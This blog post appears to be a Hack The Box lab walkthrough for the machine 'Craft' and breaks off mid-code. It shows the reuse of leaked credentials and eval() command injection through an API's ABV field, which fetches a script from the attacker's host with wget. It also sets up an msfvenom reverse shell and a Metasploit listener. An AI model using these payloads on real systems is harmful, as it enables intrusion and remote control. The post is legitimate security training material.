<!DOCTYPE html>
<html lang="en" prefix="og: https://ogp.me/ns#">
<head>
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible"
      content="IE=edge">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0" />
<meta name="description"
      content="Adventures of Functional Mediocrity" />
<meta name="keywords"
      content="zola, theme, ink, hugo-ink" /> 

<title>John Tuyen | Craft</title>
<meta
  property="og:title"
  content="John Tuyen | Craft"
/>
<meta property="og:type" content="website" />
<meta property="og:url" content="https://johntuyen.com/posts/htb-craft/" />
<meta property="og:description" content="Adventures of Functional Mediocrity" />
<meta property="og:image" content="" />
<meta property="og:image:url" content="" />
<meta property="og:image:secure_url" content="" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="Craft" />
<meta name="twitter:description" content="Adventures of Functional Mediocrity" />
<meta property="twitter:image" content="" />

<link rel="alternate"
          type="application/rss+xml"
          title="John Tuyen"
          href="https://johntuyen.com/atom.xml">
    <link rel="preconnect"
          href="https://fonts.googleapis.com">
    <link rel="preconnect"
          href="https://fonts.gstatic.com"
          crossorigin>
    <!-- <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">  -->
    <link href="https://fonts.googleapis.com/css2?family=Andada+Pro&display=swap&family=Playfair+Display"
          rel="stylesheet">
    <link rel="stylesheet"
          href="https://johntuyen.com/base.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.28.0/feather.min.js"
            integrity="sha512-7x3zila4t2qNycrtZ31HO0NnJr8kg2VI67YLoRSyi9hGhRN66FHYWr7Axa9Y1J9tGYHVBPqIjSE1ogHrJTz51g=="
            crossorigin="anonymous"></script>
</head>

<body>
    <header>
        <a class="site-name"
           href="/">
            <h1>John Tuyen</h1>
        </a>
        <div class="site-description">
            <p>Adventures of Functional Mediocrity</p>
        </div>
        <nav>
            <div class="links"> 
            <a 
                href="https://johntuyen.com/ ">About</a> 
            <a 
                href="https://johntuyen.com/posts/ ">Posts</a> 
            <a 
                href="https://johntuyen.com/gallery/ ">Gallery</a> 
            <a 
                href="https://johntuyen.com/tags/ ">Tags</a> 
            <a 
                href="https://johntuyen.com/search/ ">Search</a> 
            </div>
        </nav>
    </header>
    <article>
    

<section class="post">
  <div class="post-header">
    <div class="meta">
      <div class="date">
        <span class="day">04</span>
        <span class="rest">Jan 20</span>
      </div>
    </div>

    <div class="matter">
      <h1 class="title">Craft </h1>
    </div>
  </div>
    
  <article><ol>
<li>
<p><code>nmap</code> scans show open ports on 22, 443, 6022. Lets start with port 443.</p>
</li>
<li>
<p>Port 443 generates a web page about craft beer.</p>
<p><img src="https://johntuyen.com/posts/htb-craft/htb-craft-port443.png" alt="htb-craft-port443.png" /></p>
<p>After poking around on the site and inspecting the elements of the page, there are two notable links to check out.</p>
<p>https://api.craft.htb/api/</p>
<p>https://gogs.craft.htb/</p>
<p>Added both of those sites and including <code>craft.htb</code> to my <code>/etc/hosts</code> file.</p>
<p>The API site is built using <a href="https://swagger.io">Swagger</a> which is a software platform to build APIs. I've scoped out what this API can do and see what data is available to us. Maybe we can use this to test our exploits or dig into hidden endpoints.</p>
<p>The Gogs site is built using <a href="http://gogs.io">Gogs</a> which is a git service that can be self-hosted. Looking at what can be found, there is a public repository that hosts the API site code. Before reviewing the code, I scoped out what other information we can find about this platform and who runs it. I found this open issue that was created by Dinesh with some juicy JWT authentication information.</p>
<p><img src="https://johntuyen.com/posts/htb-craft/htb-craft-jwttoken.png" alt="htb-craft-jwttoken.png" /></p>
<p><img src="https://johntuyen.com/posts/htb-craft/htb-craft-dinesh.png" alt="htb-craft-dinesh.png" /></p>
</li>
<li>
<p>I know that I've rooted another HTB machine using JWT tokens before so I grabbed the previous command with authentication bearer and see if I get a result.</p>
<pre data-lang="json" style="background-color:#2b303b;color:#c0c5ce;" class="language-json "><code class="language-json" data-lang="json"><span>{&quot;</span><span style="color:#a3be8c;">items</span><span>&quot;: [{&quot;</span><span style="color:#a3be8c;">id</span><span>&quot;: </span><span style="color:#d08770;">12</span><span>, &quot;</span><span style="color:#a3be8c;">brewer</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">10 Barrel Brewing Company</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">name</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Pub Beer</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">style</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">American Pale Lager</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">abv</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">0.050</span><span>&quot;}, {&quot;</span><span style="color:#a3be8c;">id</span><span>&quot;: </span><span style="color:#d08770;">13</span><span>, &quot;</span><span style="color:#a3be8c;">brewer</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">18th Street Brewery</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">name</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Devil&#39;s Cup</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">style</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">American Pale Ale (APA)</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">abv</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">0.066</span><span>&quot;}, {&quot;</span><span style="color:#a3be8c;">id</span><span>&quot;: </span><span style="color:#d08770;">14</span><span>, &quot;</span><span style="color:#a3be8c;">brewer</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">18th Street Brewery</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">name</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Rise of the Phoenix</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">style</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">American IPA</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">abv</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">0.071</span><span>&quot;}, {&quot;</span><span style="color:#a3be8c;">id</span><span>&quot;: </span><span style="color:#d08770;">15</span><span>, &quot;</span><span style="color:#a3be8c;">brewer</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">18th Street Brewery</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">name</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Sinister</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">style</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">American Double / Imperial IPA</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">abv</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">0.090</span><span>&quot;}, {&quot;</span><span style="color:#a3be8c;">id</span><span>&quot;: </span><span style="color:#d08770;">16</span><span>, &quot;</span><span style="color:#a3be8c;">brewer</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">18th Street Brewery</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">name</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Sex and Candy</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">style</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">American IPA</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">abv</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">0.075</span><span>&quot;}, {&quot;</span><span style="color:#a3be8c;">id</span><span>&quot;: </span><span style="color:#d08770;">17</span><span>, &quot;</span><span style="color:#a3be8c;">brewer</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">18th Street Brewery</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">name</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Black Exodus</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">style</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Oatmeal Stout</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">abv</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">0.077</span><span>&quot;}, {&quot;</span><span style="color:#a3be8c;">id</span><span>&quot;: </span><span style="color:#d08770;">18</span><span>, &quot;</span><span style="color:#a3be8c;">brewer</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">18th Street Brewery</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">name</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Lake Street Express</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">style</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">American Pale Ale (APA)</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">abv</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">0.045</span><span>&quot;}, {&quot;</span><span style="color:#a3be8c;">id</span><span>&quot;: </span><span style="color:#d08770;">19</span><span>, &quot;</span><span style="color:#a3be8c;">brewer</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">18th Street Brewery</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">name</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Foreman</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">style</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">American Porter</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">abv</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">0.065</span><span>&quot;}, {&quot;</span><span style="color:#a3be8c;">id</span><span>&quot;: </span><span style="color:#d08770;">20</span><span>, &quot;</span><span style="color:#a3be8c;">brewer</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">18th Street Brewery</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">name</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Jade</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">style</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">American Pale Ale (APA)</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">abv</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">0.055</span><span>&quot;}, {&quot;</span><span style="color:#a3be8c;">id</span><span>&quot;: </span><span style="color:#d08770;">21</span><span>, &quot;</span><span style="color:#a3be8c;">brewer</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">18th Street Brewery</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">name</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Cone Crusher</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">style</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">American Double / Imperial IPA</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">abv</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">0.086</span><span>&quot;}], &quot;</span><span style="color:#a3be8c;">page</span><span>&quot;: </span><span style="color:#d08770;">1</span><span>, &quot;</span><span style="color:#a3be8c;">pages</span><span>&quot;: </span><span style="color:#d08770;">234</span><span>, &quot;</span><span style="color:#a3be8c;">per_page</span><span>&quot;: </span><span style="color:#d08770;">10</span><span>, &quot;</span><span style="color:#a3be8c;">total</span><span>&quot;: </span><span style="color:#d08770;">2338</span><span>}
</span></code></pre>
<p>So it does show a result but it's strange. This request looks like if you sent a GET request to the API. Using the web API interface confirms my suspicions.</p>
<p>What is also strange is that the API also asks for username and password when trying to test for authentication. I tried using the only username and password that I found which is <code>dinesh</code> and <code>4aUh0A8PbVJxgd</code>, it worked! I used <code>postman</code> to play around with the values and tokens.</p>
<p><img src="https://johntuyen.com/posts/htb-craft/htb-craft-postman.png" alt="htb-craft-postman.png" /></p>
<p>Poking around the web interface for about 5 minutes will later show the data requested can't be generated because the token is invalid. This is when I found out that I need to create a script to avoid generating a token manually every time I need to lurk around.</p>
</li>
<li>
<p>Circling back and review the repository again, I'm checking to see if there is anything we can use to authenticate with the API.  In the <code>tests</code> folder, there is a file named <code>test.py</code>.  Part of the code shows that you need to insert the username and password.  Seeing how Dinesh tried to delete this information from his commit, this must be the way in.  I've edited the code to just see if we can get a token:</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">import </span><span>requests
</span><span style="color:#b48ead;">import </span><span>json
</span><span>
</span><span>response = requests.</span><span style="color:#bf616a;">get</span><span>(&#39;</span><span style="color:#a3be8c;">https://api.craft.htb/api/auth/login</span><span>&#39;, </span><span style="color:#bf616a;">auth</span><span>=(&#39;</span><span style="color:#a3be8c;">dinesh</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">4aUh0A8PbVJxgd</span><span>&#39;), </span><span style="color:#bf616a;">verify</span><span>=</span><span style="color:#d08770;">False</span><span>)
</span><span>json_response = json.</span><span style="color:#bf616a;">loads</span><span>(response.text)
</span><span>token = json_response[&#39;</span><span style="color:#a3be8c;">token</span><span>&#39;]
</span><span>
</span><span style="color:#96b5b4;">print</span><span>(token)
</span></code></pre>
<p>And it works! A token has been generated.</p>
<p><img src="https://johntuyen.com/posts/htb-craft/htb-craft-pythonapi.png" alt="htb-craft-pythonapi.png" /></p>
</li>
<li>
<p>You can probably skip this part but I wanted to check the token to make sure it's validated each time it's being generated. There is an endpoint named <code>auth/check</code> that will do the trick.</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">import </span><span>requests
</span><span style="color:#b48ead;">import </span><span>json
</span><span>
</span><span>response = requests.</span><span style="color:#bf616a;">get</span><span>(&#39;</span><span style="color:#a3be8c;">https://api.craft.htb/api/auth/login</span><span>&#39;, </span><span style="color:#bf616a;">auth</span><span>=(&#39;</span><span style="color:#a3be8c;">dinesh</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">4aUh0A8PbVJxgd</span><span>&#39;), </span><span style="color:#bf616a;">verify</span><span>=</span><span style="color:#d08770;">False</span><span>)
</span><span>json_response = json.</span><span style="color:#bf616a;">loads</span><span>(response.text)
</span><span>status = response.status_code
</span><span>token = json_response[&#39;</span><span style="color:#a3be8c;">token</span><span>&#39;]
</span><span>
</span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot; + </span><span style="color:#bf616a;">str</span><span>(token))
</span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#bf616a;">str</span><span>(status) + &quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;)
</span><span>
</span><span>headerinfo = {&#39;</span><span style="color:#a3be8c;">X-Craft-Api-Token</span><span>&#39;: token, &#39;</span><span style="color:#a3be8c;">Content-Type</span><span>&#39;: &#39;</span><span style="color:#a3be8c;">application/json</span><span>&#39;}
</span><span>response2 = requests.</span><span style="color:#bf616a;">get</span><span>(&#39;</span><span style="color:#a3be8c;">https://api.craft.htb/api/auth/check</span><span>&#39;, </span><span style="color:#bf616a;">headers</span><span>=headerinfo, </span><span style="color:#bf616a;">verify</span><span>=</span><span style="color:#d08770;">False</span><span>)
</span><span>json_response2 = json.</span><span style="color:#bf616a;">loads</span><span>(response2.text)
</span><span>
</span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot; + </span><span style="color:#bf616a;">str</span><span>(json_response2))
</span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#bf616a;">str</span><span>(response2.status_code) + &quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;)
</span></code></pre>
</li>
<li>
<p>So now we got the token generated, validated, and ability to grab brew information from the API, what to do next? This is where I got stuck the longest but I learned about fixing my enumeration processes.</p>
<p>I fell into two rabbit holes:</p>
<ul>
<li>Trying to exploit <code>phpmyadmin-dir-traversal</code> which isn't a smart move because we didn't find <code>phpmyadmin</code> in the first place! I didn't get stuck here long though.</li>
<li>Running <code>dirbuster</code> on <code>api.craft.htb</code> and see if there is a hidden directory we may have missed.</li>
</ul>
<p>I'm not particular strong in code review because I haven't studied the possible exploitation when using certain functions. This is good practice for me though. I found the exploit code in this file: https://gogs.craft.htb/Craft/craft-api/src/master/craft_api/api/brew/endpoints/brew.py</p>
<p>Particularly this piece of code:</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>    @auth.</span><span style="color:#bf616a;">auth_required
</span><span>    @api.</span><span style="color:#bf616a;">expect</span><span>(beer_entry)
</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">post</span><span>(</span><span style="color:#bf616a;">self</span><span>):
</span><span>        </span><span style="color:#65737e;">&quot;&quot;&quot;
</span><span style="color:#65737e;">        Creates a new brew entry.
</span><span style="color:#65737e;">        &quot;&quot;&quot;
</span><span>
</span><span>        </span><span style="color:#65737e;"># make sure the ABV value is sane.
</span><span>        </span><span style="color:#b48ead;">if </span><span style="color:#96b5b4;">eval</span><span>(&#39;</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;"> &gt; 1</span><span>&#39; % request.json[&#39;</span><span style="color:#a3be8c;">abv</span><span>&#39;]):
</span><span>            </span><span style="color:#b48ead;">return </span><span>&quot;</span><span style="color:#a3be8c;">ABV must be a decimal value less than 1.0</span><span>&quot;, </span><span style="color:#d08770;">400
</span><span>        </span><span style="color:#b48ead;">else</span><span>:
</span><span>            </span><span style="color:#bf616a;">create_brew</span><span>(request.json)
</span><span>            </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">None</span><span>, </span><span style="color:#d08770;">201
</span></code></pre>
<p>A quick Google search will show sites that talks about how <code>eval</code> can be exploited if misused. </p>
<p><a href="https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html">Eval really is dangerous</a></p>
<p>A quick note about <code>eval</code> is the function evaluates the parameter given. If you evaluate an untrusted or unsanitized input, you can execute commands on the victim's machine.</p>
</li>
<li>
<p>Armed with new knowledge, I fleshed out the rest of the code with remote code execution.</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">import </span><span>requests
</span><span style="color:#b48ead;">import </span><span>json
</span><span>
</span><span>response = requests.</span><span style="color:#bf616a;">get</span><span>(&#39;</span><span style="color:#a3be8c;">https://api.craft.htb/api/auth/login</span><span>&#39;, </span><span style="color:#bf616a;">auth</span><span>=(&#39;</span><span style="color:#a3be8c;">dinesh</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">4aUh0A8PbVJxgd</span><span>&#39;), </span><span style="color:#bf616a;">verify</span><span>=</span><span style="color:#d08770;">False</span><span>)
</span><span>json_response = json.</span><span style="color:#bf616a;">loads</span><span>(response.text)
</span><span>status = response.status_code
</span><span>token = json_response[&#39;</span><span style="color:#a3be8c;">token</span><span>&#39;]
</span><span>
</span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot; + </span><span style="color:#bf616a;">str</span><span>(token))
</span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#bf616a;">str</span><span>(status) + &quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;)
</span><span>
</span><span>headerinfo = {&#39;</span><span style="color:#a3be8c;">X-Craft-Api-Token</span><span>&#39;: token, &#39;</span><span style="color:#a3be8c;">Content-Type</span><span>&#39;: &#39;</span><span style="color:#a3be8c;">application/json</span><span>&#39;}
</span><span>response2 = requests.</span><span style="color:#bf616a;">get</span><span>(&#39;</span><span style="color:#a3be8c;">https://api.craft.htb/api/auth/check</span><span>&#39;, </span><span style="color:#bf616a;">headers</span><span>=headerinfo, </span><span style="color:#bf616a;">verify</span><span>=</span><span style="color:#d08770;">False</span><span>)
</span><span>json_response2 = json.</span><span style="color:#bf616a;">loads</span><span>(response2.text)
</span><span>
</span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot; + </span><span style="color:#bf616a;">str</span><span>(json_response2))
</span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#bf616a;">str</span><span>(response2.status_code) + &quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;)
</span><span>
</span><span>brew_dict = {}
</span><span>brew_dict[&#39;</span><span style="color:#a3be8c;">abv</span><span>&#39;] = &quot;</span><span style="color:#a3be8c;">__import__(</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">subprocess</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">).getoutput(</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">wget http://10.10.14.13/rs.py</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">)</span><span>&quot;
</span><span>brew_dict[&#39;</span><span style="color:#a3be8c;">name</span><span>&#39;] = &#39;</span><span style="color:#a3be8c;">bullshit</span><span>&#39;
</span><span>brew_dict[&#39;</span><span style="color:#a3be8c;">brewer</span><span>&#39;] = &#39;</span><span style="color:#a3be8c;">bullshit</span><span>&#39;
</span><span>brew_dict[&#39;</span><span style="color:#a3be8c;">style</span><span>&#39;] = &#39;</span><span style="color:#a3be8c;">bullshit</span><span>&#39;
</span><span>
</span><span>json_data = json.</span><span style="color:#bf616a;">dumps</span><span>(brew_dict)
</span><span>
</span><span>response3 = requests.</span><span style="color:#bf616a;">post</span><span>(&#39;</span><span style="color:#a3be8c;">https://api.craft.htb/api/brew/</span><span>&#39;, </span><span style="color:#bf616a;">headers</span><span>=headerinfo, </span><span style="color:#bf616a;">data</span><span>=json_data, </span><span style="color:#bf616a;">verify</span><span>=</span><span style="color:#d08770;">False</span><span>)
</span><span>json_response3 = json.</span><span style="color:#bf616a;">loads</span><span>(response3.text)
</span><span>
</span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot; + </span><span style="color:#bf616a;">str</span><span>(response3.status_code))
</span><span style="color:#96b5b4;">print</span><span>(json_response3)
</span><span>
</span><span>brew_dict2 = {}
</span><span>brew_dict2[&#39;</span><span style="color:#a3be8c;">abv</span><span>&#39;] = &quot;</span><span style="color:#a3be8c;">__import__(</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">subprocess</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">).getoutput(</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">python rs.py</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">)</span><span>&quot;
</span><span>brew_dict2[&#39;</span><span style="color:#a3be8c;">name</span><span>&#39;] = &#39;</span><span style="color:#a3be8c;">bullshit</span><span>&#39;
</span><span>brew_dict2[&#39;</span><span style="color:#a3be8c;">brewer</span><span>&#39;] = &#39;</span><span style="color:#a3be8c;">bullshit</span><span>&#39;
</span><span>brew_dict2[&#39;</span><span style="color:#a3be8c;">style</span><span>&#39;] = &#39;</span><span style="color:#a3be8c;">bullshit</span><span>&#39;
</span><span>
</span><span>json_data2 = json.</span><span style="color:#bf616a;">dumps</span><span>(brew_dict2)
</span><span>
</span><span>response4 = requests.</span><span style="color:#bf616a;">post</span><span>(&#39;</span><span style="color:#a3be8c;">https://api.craft.htb/api/brew/</span><span>&#39;, </span><span style="color:#bf616a;">headers</span><span>=headerinfo, </span><span style="color:#bf616a;">data</span><span>=json_data2, </span><span style="color:#bf616a;">verify</span><span>=</span><span style="color:#d08770;">False</span><span>)
</span><span>json_response34= json.</span><span style="color:#bf616a;">loads</span><span>(response4.text)
</span></code></pre>
<p>In addition, I need to generate the python reverse shell code.</p>
<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">msfvenom -p</span><span> python/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=4444</span><span style="color:#bf616a;"> -o</span><span> rs.py
</span></code></pre>
</li>
<li>
<p>Start python web server and meterpreter session to receive my reverse shell connection.</p>
<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">python -m</span><span> SimpleHTTPServer 80
</span><span>
</span><span style="color:#bf616a;">msfconsole
</span><span>
</span><span style="color:#bf616a;">use</span><span> exploit/multi/handler
</span><span style="color:#96b5b4;">set</span><span> payload python/meterpreter/reverse_tcp
</span><span style="color:#96b5b4;">set</span><span> LHOST 10.10.14.13
</span><span style="color:#96b5b4;">set</span><span> LPORT 4444
</span><span style="color:#bf616a;">run
</span></code></pre>
</li>
<li>
<p>Run the script and I'm able to receive a shell on meterpreter session.</p>
</li>
<li>
<p>To my surprise, the <code>user.txt</code> flag is non-existent. I thought someone deleted the flag but nope, I am stuck in a containerized instance as <code>hostname</code> shows a string of random letters and numbers.</p>
</li>
<li>
<p>I got lost for a while trying to figure out how to break out of this instance. I noticed there is a directory at <code>/opt/app</code> that resembles the same code as the repository. Out of chance, I noticed there is a file called <code>models.py</code>. This file generates the database structure for brew and one other important table, &quot;Users&quot;.</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">class </span><span style="color:#ebcb8b;">User</span><span style="color:#eff1f5;">(</span><span style="color:#a3be8c;">db.Model</span><span style="color:#eff1f5;">):
</span><span>    </span><span style="color:#96b5b4;">id </span><span>= db.</span><span style="color:#bf616a;">Column</span><span>(db.Integer, </span><span style="color:#bf616a;">primary_key</span><span>=</span><span style="color:#d08770;">True</span><span>)
</span><span>    username = db.</span><span style="color:#bf616a;">Column</span><span>(db.</span><span style="color:#bf616a;">String</span><span>(</span><span style="color:#d08770;">45</span><span>))
</span><span>    password = db.</span><span style="color:#bf616a;">Column</span><span>(db.</span><span style="color:#bf616a;">String</span><span>(</span><span style="color:#d08770;">80</span><span>))
</span><span>
</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#96b5b4;">__init__</span><span>(</span><span style="color:#bf616a;">self</span><span>, </span><span style="color:#bf616a;">username</span><span>, </span><span style="color:#bf616a;">password</span><span>):
</span><span>        </span><span style="color:#bf616a;">self</span><span>.username = username
</span><span>        </span><span style="color:#bf616a;">self</span><span>.password = password
</span></code></pre>
<p>I had the immediate idea that I should have enumerated the possible hidden databases for possible logins.</p>
</li>
<li>
<p>The other piece of information that came together while looking into database enumeration was this file called <code>dbtest.py</code>. It's a simple file that connects to the database and retrieves 1 result from brew table.</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;">#!/usr/bin/env python
</span><span>
</span><span style="color:#b48ead;">import </span><span>pymysql
</span><span style="color:#b48ead;">from </span><span>craft_api </span><span style="color:#b48ead;">import </span><span>settings
</span><span>
</span><span style="color:#65737e;"># test connection to mysql database
</span><span>
</span><span>connection = pymysql.</span><span style="color:#bf616a;">connect</span><span>(</span><span style="color:#bf616a;">host</span><span>=settings.</span><span style="color:#bf616a;">MYSQL_DATABASE_HOST</span><span>,
</span><span>                             </span><span style="color:#bf616a;">user</span><span>=settings.</span><span style="color:#bf616a;">MYSQL_DATABASE_USER</span><span>,
</span><span>                             </span><span style="color:#bf616a;">password</span><span>=settings.</span><span style="color:#bf616a;">MYSQL_DATABASE_PASSWORD</span><span>,
</span><span>                             </span><span style="color:#bf616a;">db</span><span>=settings.</span><span style="color:#bf616a;">MYSQL_DATABASE_DB</span><span>,
</span><span>                             </span><span style="color:#bf616a;">cursorclass</span><span>=pymysql.cursors.DictCursor)
</span><span>
</span><span style="color:#b48ead;">try</span><span>: 
</span><span>    </span><span style="color:#b48ead;">with </span><span>connection.</span><span style="color:#bf616a;">cursor</span><span>() </span><span style="color:#b48ead;">as </span><span>cursor:
</span><span>   
</span><span>        sql = &quot;</span><span style="color:#b48ead;">SELECT </span><span>`</span><span style="color:#a3be8c;">id</span><span>`</span><span style="color:#a3be8c;">, </span><span>`</span><span style="color:#a3be8c;">brewer</span><span>`</span><span style="color:#a3be8c;">, </span><span>`</span><span style="color:#a3be8c;">name</span><span>`</span><span style="color:#a3be8c;">, </span><span>`</span><span style="color:#a3be8c;">abv</span><span>` </span><span style="color:#b48ead;">FROM </span><span>`</span><span style="color:#a3be8c;">brew</span><span>` </span><span style="color:#b48ead;">LIMIT </span><span style="color:#d08770;">1</span><span>&quot;
</span><span>        cursor.</span><span style="color:#bf616a;">execute</span><span>(sql)
</span><span>        result = cursor.</span><span style="color:#bf616a;">fetchone</span><span>()
</span><span>        </span><span style="color:#96b5b4;">print</span><span>(result)
</span><span>
</span><span style="color:#b48ead;">finally</span><span>:
</span><span>    connection.</span><span style="color:#bf616a;">close</span><span>()
</span></code></pre>
<p>Let's see if we can retrieve data from the &quot;User&quot; table by modifying the code:</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;">#!/usr/bin/env python
</span><span>
</span><span style="color:#b48ead;">import </span><span>pymysql
</span><span style="color:#b48ead;">from </span><span>craft_api </span><span style="color:#b48ead;">import </span><span>settings
</span><span>
</span><span style="color:#65737e;"># test connection to mysql database
</span><span>
</span><span>connection = pymysql.</span><span style="color:#bf616a;">connect</span><span>(</span><span style="color:#bf616a;">host</span><span>=settings.</span><span style="color:#bf616a;">MYSQL_DATABASE_HOST</span><span>,
</span><span>                             </span><span style="color:#bf616a;">user</span><span>=settings.</span><span style="color:#bf616a;">MYSQL_DATABASE_USER</span><span>,
</span><span>                             </span><span style="color:#bf616a;">password</span><span>=settings.</span><span style="color:#bf616a;">MYSQL_DATABASE_PASSWORD</span><span>,
</span><span>                             </span><span style="color:#bf616a;">db</span><span>=settings.</span><span style="color:#bf616a;">MYSQL_DATABASE_DB</span><span>,
</span><span>                             </span><span style="color:#bf616a;">cursorclass</span><span>=pymysql.cursors.DictCursor)
</span><span>
</span><span style="color:#b48ead;">try</span><span>: 
</span><span>    </span><span style="color:#b48ead;">with </span><span>connection.</span><span style="color:#bf616a;">cursor</span><span>() </span><span style="color:#b48ead;">as </span><span>cursor:
